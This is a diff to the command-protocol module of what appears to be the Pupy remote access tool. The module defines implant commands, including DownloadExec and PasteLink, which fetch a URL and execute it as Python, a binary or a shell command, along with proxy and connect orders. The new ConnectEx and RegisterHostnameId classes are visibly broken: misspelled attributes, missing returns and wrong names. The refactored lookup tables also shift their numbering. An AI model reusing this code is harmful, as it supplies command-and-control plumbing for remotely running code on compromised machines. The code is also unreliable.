@@ -29,7 +29,8 @@ import uuid
 import urlparse
 import socket
 
-from . import baseconv
+import baseconv
+import dns_encoder
 
 try:
     import psutil
@@ -46,11 +47,14 @@ try:
 except ImportError:
     online = None
 
+
 class PackError(Exception):
     pass
 
+
 def from_bytes(bytes):
     return sum(ord(byte) * (256**i) for i, byte in enumerate(bytes))
+
 
 def to_bytes(value, size=0):
     value = long(value)
@@ -61,6 +65,16 @@ def to_bytes(value, size=0):
     bytes = ''.join(bytes)
     bytes += '\x00'*(size-len(bytes))
     return bytes
+
+
+def generate_encoding_tables(*alphabet):
+    decode = dict(enumerate(alphabet, 1))
+    encode = {
+        v:k for k,v in decode.iteritems()
+    }
+
+    return encode, decode
+
 
 class Command(object):
     __slots__ = ('session_required', 'internet_required')
@@ -75,6 +89,7 @@ class Command(object):
     def unpack(data):
         return Command(), 0
 
+
 class Poll(Command):
     __slots__ = ()
 
@@ -84,6 +99,7 @@ class Poll(Command):
 
     def __repr__(self):
         return '{POLL}'
+
 
 class SystemStatus(Command):
     __slots__ = ('cpu', 'users', 'mem', 'listen', 'remote', 'idle')
@@ -214,6 +230,7 @@ class Idle(Command):
     def __repr__(self):
         return '{IDLE}'
 
+
 class Sleep(Command):
     __slots__ = ('timeout')
 
@@ -231,6 +248,7 @@ class Sleep(Command):
 
     def __repr__(self):
         return '{{SLEEP: {}}}'.format(self.timeout)
+
 
 class CheckConnect(Command):
     __slots__ = ('host', 'port_start', 'port_end')
@@ -263,6 +281,7 @@ class CheckConnect(Command):
         return '{{CHECK: {}:{}-{}}}'.format(
             self.host, self.port_start, self.port_end)
 
+
 class Reexec(Command):
     __slots__ = ()
 
@@ -272,6 +291,7 @@ class Reexec(Command):
 
     def __repr__(self):
         return '{REEXEC}'
+
 
 class Exit(Command):
     __slots__ = ()
@@ -283,6 +303,7 @@ class Exit(Command):
     def __repr__(self):
         return '{EXIT}'
 
+
 class Disconnect(Command):
     __slots__ = ()
 
@@ -292,6 +313,7 @@ class Disconnect(Command):
 
     def __repr__(self):
         return '{DISCONNECT}'
+
 
 class Policy(Command):
     __slots__ = ('timestamp', 'poll', 'kex')
@@ -315,6 +337,7 @@ class Policy(Command):
         poll = field & ((1<<30)-1)
         return Policy(poll, kex, timestamp), 8
 
+
 class Kex(Command):
     __slots__ = ('parcel')
 
@@ -336,6 +359,7 @@ class Kex(Command):
         length = struct.unpack_from('B', data)[0]
         return Kex(data[1:1+length]), 1+length
 
+
 class SystemInfo(Command):
 
     __slots__ = (
@@ -347,19 +371,13 @@ class SystemInfo(Command):
 
     # To do, add more? Who knows how platform.uname looks like on other platforms?
     # How many are there? Let's use 3 bits for that - 8 systems in total
-    well_known_os_names_decode = dict(enumerate([
-        'Linux', 'Windows', 'SunOS', 'android'
-    ]))
-    well_known_os_names_encode = {
-        v:k for k,v in well_known_os_names_decode.iteritems()
-    }
+    well_known_os_names_encode, well_known_os_names_decode = \
+      generate_encoding_tables(
+        'Linux', 'Windows', 'SunOS', 'android')
+
     # Same question.
-    well_known_cpu_archs_decode = dict(enumerate([
-        'x86', 'x86', 'x64', 'x64', 'arm'
-    ]))
-    well_known_cpu_archs_encode = {
-        v:k for k,v in well_known_cpu_archs_decode.iteritems()
-    }
+    well_known_cpu_archs_encode, well_known_cpu_archs_decode = \
+      generate_encoding_tables('x86', 'x86', 'x64', 'x64', 'arm')
 
     well_known_machines_equality = {
         'i386': 'x86',
@@ -467,16 +485,12 @@ class SystemInfo(Command):
             boottime=boottime
         ), 1+6+8
 
+
 class SetProxy(Command):
     __slots__ = ('scheme', 'ip', 'port', 'user', 'password')
 
-    well_known_proxy_schemes_decode = dict(enumerate([
-        'none', 'socks4', 'socks5', 'http', 'any'
-    ], 1))
-
-    well_known_proxy_schemes_encode = {
-        v:k for k,v in well_known_proxy_schemes_decode.iteritems()
-    }
+    well_known_proxy_schemes_encode, well_known_proxy_schemes_decode = \
+      generate_encoding_tables('none', 'socks4', 'socks5', 'http', 'any')
 
     def __init__(self, scheme, ip, port, user=None, password=None):
         if scheme == 'socks':
@@ -545,18 +559,15 @@ class SetProxy(Command):
             self.scheme, auth, self.ip, self.port
         )
 
+
 class Connect(Command):
     __slots__ = ('ip', 'port', 'transport')
 
-    well_known_transports_decode = dict(enumerate([
+    well_known_transports_encode, well_known_transports_decode = \
+      generate_encoding_tables(
         'obfs3','kc4','http','tcp_cleartext','rsa',
         'ssl','udp_cleartext','scramblesuit','ssl_rsa', 'ec4',
-        'ws', 'ecm'
-    ], 1))
-
-    well_known_transports_encode = {
-        v:k for k,v in well_known_transports_decode.iteritems()
-    }
+        'ws', 'ecm')
 
     def __init__(self, ip, port, transport='ssl'):
         self.transport = transport
@@ -608,27 +619,18 @@ class Connect(Command):
 
         return Connect(host, port, transport), 1+length
 
+
 class DownloadExec(Command):
 
     __slots__ = ('proxy', 'url', 'action')
 
     # 2 bits - 3 max
-    well_known_downloadexec_action_decode = dict(enumerate([
-        'pyexec', 'exec', 'sh'
-    ]))
-
-    well_known_downloadexec_action_encode = {
-        v:k for k,v in well_known_downloadexec_action_decode.iteritems()
-    }
+    well_known_downloadexec_action_encode, well_known_downloadexec_action_decode = \
+      generate_encoding_tables('pyexec', 'exec', 'sh')
 
     # 3 bits - 7 max
-    well_known_downloadexec_scheme_decode = dict(enumerate([
-        'http', 'https', 'ftp', 'tcp', 'udp', 'tls'
-    ]))
-
-    well_known_downloadexec_scheme_encode = {
-        v:k for k,v in well_known_downloadexec_scheme_decode.iteritems()
-    }
+    well_known_downloadexec_scheme_encode, well_known_downloadexec_scheme_decode = \
+      generate_encoding_tables('http', 'https', 'ftp', 'tcp', 'udp', 'tls')
 
     def __init__(self, url, action='pyexec', proxy=False):
         self.proxy = bool(proxy)
@@ -696,6 +698,7 @@ class DownloadExec(Command):
             scheme, host, port, path
         ), action, proxy), bsize+plen
 
+
 class PasteLink(Command):
 
     __slots__ = ('url', 'action')
@@ -754,13 +757,8 @@ class PasteLink(Command):
     }
 
     # 4 max - 2 bits
-    well_known_pastebin_action_decode = dict(enumerate([
-        'pyexec', 'exec', 'sh'
-    ]))
-
-    well_known_pastebin_action_encode = {
-        v:k for k,v in well_known_pastebin_action_decode.iteritems()
-    }
+    well_known_pastebin_action_encode, well_known_pastebin_action_decode = \
+      generate_encoding_tables('pyexec', 'exec', 'sh')
 
     def __init__(self, url, action='pyexec'):
         self.url = url
@@ -815,6 +813,7 @@ class PasteLink(Command):
             action = PasteLink.well_known_pastebin_action_decode[(h1 >> 5) & 3]
             length = h1 & 31
             return PasteLink(data[1:length+1], action), 1+length
+
 
 class OnlineStatus(Command):
 
@@ -876,6 +875,7 @@ class OnlineStatus(Command):
                         x for x in v.itervalues()
                     ])) for k,v in self.get_dict().iteritems()))
 
+
 class PortQuizPort(Command):
 
     __slots__ = ('ports')
@@ -898,6 +898,7 @@ class PortQuizPort(Command):
     def __str__(self):
         return '{{PORTQUIZ: {}}}'.format(','.join(str(x) for x in sorted(self.ports)))
 
+
 class OnlineStatusRequest(Command):
 
     __slots__ = ()
@@ -909,39 +910,74 @@ class OnlineStatusRequest(Command):
     def __repr__(self):
         return '{ONLINE-STATUS-REQUEST}'
 
+
 class PupyState(Command):
 
-    __slots__ = ('connected', 'pstore_dirty')
+    __slots__ = (
+        'connected', 'pstore_dirty',
+        'has_ipv6', 'support_connect_v2',
+        'has_emergency_mode'
+    )
+
+    IS_CONNECTED = (1 << 0)
+    IS_DIRTY = (1 << 1)
+    HAS_IPV6 = (1 << 2)
+    SUPPORT_CONNECT_V2 = (1 << 3)
+    HAS_EMERGENCY_MODE = (1 << 4)
 
     @staticmethod
     def unpack(data):
         records_count, = struct.unpack_from('B', data)
         records = struct.unpack_from('B'*records_count, data[1:])
 
-        connected = records[0] & (1 << 0)
-        pstore_dirty = records[0] & (1 << 1)
+        connected = records[0] & PupyState.IS_CONNECTED
+        pstore_dirty = records[0] & PupyState.IS_DIRTY
+        has_ipv6 = records[0] & PupyState.HAS_IPV6
+        support_connect_v2 = records[0] & PupyState.SUPPORT_CONNECT_V2
+        has_emergency_mode = records[0] & PupyState.HAS_EMERGENCY_MODE
 
-        return PupyState(connected, pstore_dirty), records_count + 1
+        return PupyState(
+            connected, pstore_dirty, has_ipv6, support_connect_v2,
+            has_emergency_mode
+        ), records_count + 1
 
     def pack(self):
         records_count = 1
         record = 0
         if self.connected:
-            record |= 0x1 << 0
+            record |= PupyState.IS_CONNECTED
 
         if self.pstore_dirty:
-            record |= 0x1 << 1
+            record |= PupyState.IS_DIRTY
+
+        if self.has_ipv6:
+            record |= PupyState.HAS_IPV6
+
+        if self.support_connect_v2:
+            record |= PupyState.SUPPORT_CONNECT_V2
+
+        if self.has_emergency_mode:
+            record |= PupyState.HAS_EMERGENCY_MODE
 
         return struct.pack(
             'B' + 'B'*records_count, records_count, record)
 
-    def __init__(self, connected=False, pstore_dirty=False):
+    def __init__(
+        self, connected=False, pstore_dirty=False,
+            has_ipv6=False, support_connect_v2=True, has_emergency_mode=False):
+
         self.connected = connected
         self.pstore_dirty = pstore_dirty
+        self.has_ipv6 = has_ipv6
+        self.support_connect_v2 = support_connect_v2
+        self.has_emergency_mode = has_emergency_mode
 
     def __repr__(self):
-        return '{{PUPY-STATE: CONNECTED={} PSTORE={}}}'.format(
-            self.connected, self.pstore_dirty)
+        return '{{PUPY-STATE: CONNECTED={} PSTORE={} ' \
+          'IPV6={} CONNV2={} EMERGENCY={}}}'.format(
+            self.connected, self.pstore_dirty,
+              self.has_ipv6, self.support_connect_v2, self.has_emergency_mode)
+
 
 class ConnectablePort(Command):
 
@@ -970,6 +1006,76 @@ class ConnectablePort(Command):
 
     def __str__(self):
         return '{{OPEN: {}:{}}}'.format(self.ip, ','.join(str(x) for x in self.ports))
+
+
+class ConnectEx(Command):
+    __slots__ = (
+        'version', 'address', 'is_hostname',
+        'port', 'fronting', 'transport'
+    )
+
+    IPV4 = 0b01
+    IPV6 = 0b10
+    TARGET_ID = 0b11
+
+    well_known_transports_encode, well_known_transports_decode = \
+      generate_encoding_tables(
+          'obfs3','kc4','http', 'rsa', 'ssl','scramblesuit',
+          'ssl_rsa', 'ec4', 'ws', 'ecm', 'dfws')
+
+    #  1        - FRONTING
+    #   111     - TYPE
+    #      1111 - PORT
+    #  11111111 - TRANSPORT
+
+    def __init__(self, address):
+        pass
+
+    def pack(self):
+        address_type = None
+        address = None
+
+        if type(self.address) in (long, int) and \
+          self.address > 0 and self.address < 65536:
+            address_type = ConnectEx.TARGET_ID
+            address = struct.pack('>H', self.address)
+        else:
+            try:
+                address = netaddr.IPAddress(self.address)
+                if address.verision == 6:
+                    address_type = ConnectEx.IPV6
+                else:
+                    address_type = ConnectEx.IPV4
+
+                address = address.packed
+
+            except netaddr.AddrFormatError:
+                raise ValueError('Invalid address type')
+
+
+
+class RegisterHostnameId(Command):
+    __slots__ = ('hostname', 'id')
+
+    encoder = dns_encoder.DnsEncoder()
+
+    def __init__(self, hid, hostname):
+        self.id = hid
+        self.hostname = hostname
+
+    def pack(self):
+        encoded_hostname = RegisterHostnameId.dns_encoder.encode(self.hostname)
+        return struct.pack('>H', self.id) + encoded_hostname
+
+    @staticmethod
+    def unpack(data):
+        hid, = struct.unpack_from('>H', data)
+        decoded, rest = RegisterHostnameId.dns_encoder.decode(data[2:])
+
+        return RegisterHostnameId(hid, decoded), len(data) - len(rest)
+
+    def __repr__(self):
+        return '{{{} => {}}}'.format(self.hid, self.hostname)
 
 
 class Error(Command):
@@ -1023,6 +1129,7 @@ class CustomEvent(Command):
         eventid, = struct.unpack_from('>I', data)
         return CustomEvent(eventid), 4
 
+
 class ParcelInvalidCrc(Exception):
 
     __slots__ = ()
@@ -1031,6 +1138,7 @@ class ParcelInvalidCrc(Exception):
     def error(self):
         return Error('CRC_FAILED')
 
+
 class ParcelInvalidPayload(Exception):
 
     __slots__ = ()
@@ -1038,6 +1146,7 @@ class ParcelInvalidPayload(Exception):
     @property
     def error(self):
         return Error('CRC_FAILED')
+
 
 class ParcelInvalidCommand(Exception):
 
@@ -1049,23 +1158,22 @@ class ParcelInvalidCommand(Exception):
     def __repr__(self):
         return 'Unknown command: {}'.format(self.command)
 
+
 class Parcel(object):
 
     __slots__ = ('commands')
 
     # Explicitly define commands. In other case make break something
-    COMMANDS = [
+
+    COMMANDS = (
         Poll, Ack, Policy, Idle, Kex,
         Connect, PasteLink, SystemInfo, Error, Disconnect, Exit,
         Sleep, Reexec, DownloadExec, CheckConnect, SystemStatus,
         SetProxy, OnlineStatusRequest, OnlineStatus, ConnectablePort,
         PortQuizPort, PupyState, CustomEvent
-    ]
+    )
 
-    commands_decode = dict(enumerate(COMMANDS))
-    commands_encode = {
-        v:k for k,v in commands_decode.iteritems()
-    }
+    commands_encode, commands_decode = generate_encoding_tables(*COMMANDS)
 
     def __init__(self, *commands):
 
